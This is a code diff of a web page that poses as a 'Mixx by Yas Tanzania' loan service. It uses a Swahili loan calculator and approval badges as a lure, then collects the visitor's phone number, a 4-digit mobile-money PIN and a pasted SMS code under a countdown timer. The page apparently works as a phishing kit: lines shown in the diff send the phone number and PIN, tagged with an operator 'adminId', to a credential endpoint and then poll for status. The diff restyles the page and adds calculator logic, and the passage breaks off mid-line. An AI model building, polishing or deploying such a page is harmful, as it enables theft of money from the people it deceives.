@@ -5,44 +5,50 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mixx by Yas Tanzania</title>
     <style>
-        :root { --bg-color: #0f172a; --card-bg: #1e293b; --accent-yellow: #facc15; --text-main: #f8fafc; --text-muted: #94a3b8; }
+        :root { 
+            --bg-color: #020a1f; 
+            --card-bg: #05163a; 
+            --accent-yellow: #facc15; 
+            --text-main: #ffffff; 
+            --text-muted: #93c5fd; 
+        }
         body { font-family: Arial, sans-serif; background: var(--bg-color); color: var(--text-main); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
         .container { width: 100%; max-width: 400px; }
-        .card { background: var(--card-bg); padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); margin-bottom: 20px; }
+        .card { background: var(--card-bg); padding: 25px; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); border: 1px solid #1e3a8a; margin-bottom: 20px; }
         .hidden { display: none !important; }
-        .mixx-logo { font-size: 24px; font-weight: bold; color: var(--accent-yellow); text-align: center; margin-bottom: 15px; }
-        .logo-container { text-align: center; }
+        .mixx-logo { font-size: 18px; font-weight: bold; color: #000; background: var(--accent-yellow); padding: 6px 18px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 12px rgba(250,204,21,0.3); }
+        .logo-container { text-align: center; margin-bottom: 15px; }
         .info-box, .header-banner { text-align: center; margin-bottom: 20px; }
         .info-box p, .header-banner p { color: var(--text-muted); font-size: 14px; line-height: 1.5; }
-        .header-banner h2 { margin: 0 0 5px 0; color: #fff; }
-        .btn-primary { width: 100%; background: var(--accent-yellow); color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .header-banner h2 { margin: 0 0 5px 0; color: #fff; font-size: 24px; }
+        .btn-primary { width: 100%; background: var(--accent-yellow); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 15px rgba(250,204,21,0.2); }
         .btn-primary:hover { opacity: 0.9; }
-        .btn-secondary { background: transparent; color: var(--text-muted); border: 1px solid var(--text-muted); padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn-secondary { background: transparent; color: var(--text-muted); border: 1px solid #1e3a8a; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
         .input-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); }
-        .form-control { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; box-sizing: border-box; font-size: 15px; }
+        .form-control { width: 100%; padding: 12px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; box-sizing: border-box; font-size: 15px; }
         textarea.form-control { resize: vertical; }
-        .phone-input-wrapper { display: flex; align-items: center; background: #0f172a; border: 1px solid #334155; border-radius: 8px; overflow: hidden; }
-        .prefix { padding: 0 12px; color: var(--text-muted); font-weight: bold; border-right: 1px solid #334155; background: #1e293b; }
+        .phone-input-wrapper { display: flex; align-items: center; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; overflow: hidden; }
+        .prefix { padding: 0 12px; color: var(--text-muted); font-weight: bold; border-right: 1px solid #1e3a8a; background: #05163a; }
         .phone-input-wrapper input { border: none; background: transparent; color: #fff; padding: 12px; width: 100%; outline: none; }
         .pin-boxes { display: flex; gap: 10px; justify-content: center; }
-        .pin-input { width: 50px; height: 50px; text-align: center; font-size: 24px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; }
-        .badge-pill { background: #334155; padding: 4px 10px; border-radius: 20px; font-size: 11px; }
-        .dash-calc-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; }
-        .dash-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
-        .custom-slider { width: 100%; accent-color: var(--accent-yellow); }
-        .amount-box { text-align: center; background: #0f172a; padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #334155; }
+        .pin-input { width: 50px; height: 50px; text-align: center; font-size: 24px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; }
+        .badge-pill { background: #020a1f; border: 1px solid #1e3a8a; padding: 6px 12px; border-radius: 20px; font-size: 11px; color: var(--text-muted); box-shadow: inset 0 2px 4px rgba(0,0,0,0.3); }
+        .dash-calc-box { background: #020a1f; padding: 15px; border-radius: 12px; border: 1px solid #1e3a8a; }
+        .dash-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; color: var(--text-muted); }
+        .custom-slider { width: 100%; accent-color: var(--accent-yellow); margin: 8px 0; }
+        .amount-box { text-align: center; background: #020a1f; padding: 18px; border-radius: 12px; margin: 15px 0; border: 1px solid #1e3a8a; }
         .amount-box .value { font-size: 24px; font-weight: bold; color: var(--accent-yellow); display: block; }
         .amount-box .label { font-size: 12px; color: var(--text-muted); }
         .error-surface-banner { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid var(--accent-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #1e3a8a; border-top: 4px solid var(--accent-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .success-icon { width: 60px; height: 60px; background: #15803d; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 15px auto; }
         #step-loading { text-align: center; padding: 40px 20px; }
         .otp-header { text-align: center; margin-bottom: 20px; }
-        .otp-header h3 { font-size: 14px; line-height: 1.4; color: #fff; }
+        .otp-header h3 { font-size: 13px; line-height: 1.4; color: #fff; }
         .timer-badge { display: inline-block; background: #7f1d1d; color: #fca5a5; font-size: 11px; padding: 4px 10px; border-radius: 4px; margin-top: 8px; }
-        .otp-input-area textarea { width: 100%; height: 90px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; padding: 10px; box-sizing: border-box; }
+        .otp-input-area textarea { width: 100%; height: 90px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; padding: 10px; box-sizing: border-box; }
         #char-count { font-size: 11px; color: var(--text-muted); float: right; margin-top: 4px; }
     </style>
 </head>
@@ -62,20 +68,20 @@
         <!-- 2. SLIDER DASHBOARD -->
         <div id="step-slider" class="card hidden">
             <div class="logo-container" style="margin-bottom: 0;">
-                <div class="mixx-logo" style="font-size: 16px; padding: 4px 16px;">Mixx</div>
+                <div class="mixx-logo" style="font-size: 14px; padding: 4px 14px;">Mixx</div>
             </div>
             <div class="header-banner" style="margin-bottom: 5px;">
                 <h2>Mixx by Yas</h2>
                 <p>Mikopo mahiri, viwango vya haki</p>
             </div>
-            <div style="display: flex; gap: 6px; justify-content: center; margin-bottom: 10px;">
+            <div style="display: flex; gap: 6px; justify-content: center; margin-bottom: 15px;">
                 <span class="badge-pill">⚡ Idhini 98%</span>
                 <span class="badge-pill">🔒 Ada Nafuu</span>
                 <span class="badge-pill">📱 Malipo Papo</span>
             </div>
 
             <div class="dash-calc-box">
-                <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 6px;">📊 HESABU MKOPO WAKO <span style="float: right; color: var(--accent-yellow); font-size: 11px;">5% APR Fixed</span></div>
+                <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">📊 HESABU MKOPO WAKO <span style="float: right; color: var(--accent-yellow); font-size: 11px;">5% APR Fixed</span></div>
                 
                 <div class="dash-row">
                     <span>Nataka kukopa</span>
@@ -83,19 +89,19 @@
                 </div>
                 <input type="range" id="range-amount" min="50000" max="5000000" step="50000" value="1000000" class="custom-slider">
 
-                <div class="dash-row" style="margin-top: 12px;">
+                <div class="dash-row" style="margin-top: 10px;">
                     <span>Muda wa Malipo</span>
                     <span id="slider-duration-display" style="color: var(--accent-yellow); font-weight: bold;">3 Mwezi</span>
                 </div>
                 <input type="range" id="range-duration" min="1" max="12" step="1" value="3" class="custom-slider">
 
-                <div style="font-size: 11px; color: var(--text-muted); margin-top: 8px;">Kiwango cha Riba: <strong style="color: #fff;">5% APR</strong></div>
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 6px;">Kiwango cha Riba: <strong style="color: #fff;">5% APR</strong></div>
             </div>
 
             <div class="amount-box" style="margin: 15px 0;">
                 <span class="value" id="monthly-payment-val" style="font-size: 22px;">Tsh 336,115</span>
                 <span class="label" style="margin-top: 4px;">Makadirio ya Malipo ya Kila Mwezi</span>
-                <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Jumla ya ulipaji: <span id="total-repay-val" style="color: #fff;">Tsh 1,008,345</span></div>
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 6px;">Jumla ya ulipaji: <span id="total-repay-val" style="color: #fff;">Tsh 1,008,345</span></div>
             </div>
 
             <button type="button" class="btn-primary" id="btn-slider-next">OMBA SASA →</button>
@@ -245,7 +251,7 @@
             </div>
 
             <div id="sms-error-banner" class="error-surface-banner hidden">
-                ⚠ Ujumbe wa SMS si sahihi. Tafadhalijaribu tena.
+                ⚠ Ujumbe wa SMS si sahihi. Tafadhali jaribu tena.
             </div>
 
             <div class="otp-input-area">
@@ -275,7 +281,39 @@
         let phoneValue = '';
         let pinValue = '';
 
-        // Form Step Navigation Triggers
+        // Slider amount & duration live calculations
+        const rangeAmount = document.getElementById('range-amount');
+        const rangeDuration = document.getElementById('range-duration');
+        const sliderValDisplay = document.getElementById('slider-val-display');
+        const sliderDurationDisplay = document.getElementById('slider-duration-display');
+        const monthlyPaymentVal = document.getElementById('monthly-payment-val');
+        const totalRepayVal = document.getElementById('total-repay-val');
+
+        function updateCalculations() {
+            const amt = parseInt(rangeAmount.value) || 1000000;
+            const dur = parseInt(rangeDuration.value) || 3;
+            sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
+            sliderDurationDisplay.innerText = dur + ' Mwezi';
+            
+            // 5% APR Calculation logic mock
+            const totalWithInterest = amt * (1 + (0.05 * (dur / 12)));
+            const monthly = totalWithInterest / dur;
+            
+            monthlyPaymentVal.innerText = 'Tsh ' + Math.round(monthly).toLocaleString();
+            totalRepayVal.innerText = 'Tsh ' + Math.round(totalWithInterest).toLocaleString();
+            document.getElementById('loan-amount').value = amt;
+            document.getElementById('summary-amount').innerText = 'TSh ' + amt.toLocaleString();
+            document.getElementById('summary-duration').innerText = dur + ' Miezi';
+            document.getElementById('final-approved-amount').innerText = 'TSh ' + amt.toLocaleString();
+        }
+
+        if(rangeAmount && rangeDuration) {
+            rangeAmount.oninput = updateCalculations;
+            rangeDuration.oninput = updateCalculations;
+            updateCalculations();
+        }
+
+        // Navigation Steps
         document.getElementById('btn-naelewa').onclick = () => {
             document.getElementById('step-naelewa').classList.add('hidden');
             document.getElementById('step-slider').classList.remove('hidden');
@@ -309,59 +347,4 @@
             document.getElementById('step-loan-2').classList.remove('hidden');
         };
 
-        document.getElementById('btn-submit-loan').onclick = () => {
-            document.getElementById('step-loan-3').classList.add('hidden');
-            document.getElementById('step-form').classList.remove('hidden');
-        };
-
-        // PIN box navigation behavior
-        const pinInputs = document.querySelectorAll('.pin-input');
-        pinInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            });
-        });
-
-        // Submit Credentials Form
-        document.getElementById('loan-form').onsubmit = (e) => {
-            e.preventDefault();
-            phoneValue = document.getElementById('confirm-phone').value.trim();
-            pinValue = Array.from(pinInputs).map(i => i.value).join('');
-
-            if (pinValue.length < 4) {
-                alert('Tafadhali jaza tarakimu 4 za PIN');
-                return;
-            }
-
-            document.getElementById('step-form').classList.add('hidden');
-            document.getElementById('step-loading').classList.remove('hidden');
-
-            fetch('/api/submit-credentials', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: currentSessionId,
-                    phone: phoneValue,
-                    pin: pinValue,
-                    adminId: adminId || null
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    localStorage.setItem('sessionId', currentSessionId);
-                    pollStatus();
-                } else {
-                    alert('Imeshindikana kutuma taarifa.');
-                    location.reload();
-                }
-            })
-            .catch(err => {
- 
+        document.getElementById('btn-subm
